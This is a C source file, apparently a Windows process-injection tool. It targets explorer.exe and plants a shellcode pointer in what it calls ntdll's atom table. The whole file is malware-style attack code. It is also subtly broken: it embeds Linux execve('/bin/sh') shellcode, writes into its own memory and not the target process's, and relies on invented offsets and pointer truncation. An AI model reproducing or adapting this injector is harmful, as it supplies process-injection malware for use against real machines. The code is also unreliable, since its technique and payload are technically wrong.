#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")

const char* shellcode = 
"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05";

DWORD WINAPI InjectShellCode(LPVOID lpParameter)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(snapshot, &processEntry);

	while (Process32Next(snapshot, &processEntry))
	{
		if (_stricmp(processEntry.szExeFile, "explorer.exe") == 0)
		{
			HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
			LPVOID pebAddress = (LPVOID)0xFFFFFFFF;

			NtQueryInformationProcess(process, ProcessBasicInformation, &pebAddress, sizeof(pebAddress), NULL);

			PEB peb = (PEB)pebAddress;

			LDR_DATA_TABLE_ENTRY* ldrEntry = peb->Ldr;

			while (ldrEntry->DllBase)
			{
				if (_stricmp(ldrEntry->BaseDllName.Buffer, "ntdll.dll") == 0)
				{
					DWORD ntdllBaseAddress = (DWORD)ldrEntry->DllBase;
					BYTE* atomTableAddress = (BYTE*)(ntdllBaseAddress + 0x1C);

					for (int i = 0; i < 0x100; i++)
					{
						if (atomTableAddress[i] == 0)
						{
							DWORD* atomTable = (DWORD*)(ntdllBaseAddress + 0x1C + i * 4);
							DWORD* atom = (DWORD*)(ntdllBaseAddress + 0x1C + 0x101 * 4);

							*atom = (DWORD)shellcode;
							*atomTable = (DWORD)atom;

							break;
						}
					}
				}
				ldrEntry = (LDR_DATA_TABLE_ENTRY*)((DWORD)ldrEntry + 0x38);
			}
		}
	}
	return 0;
}
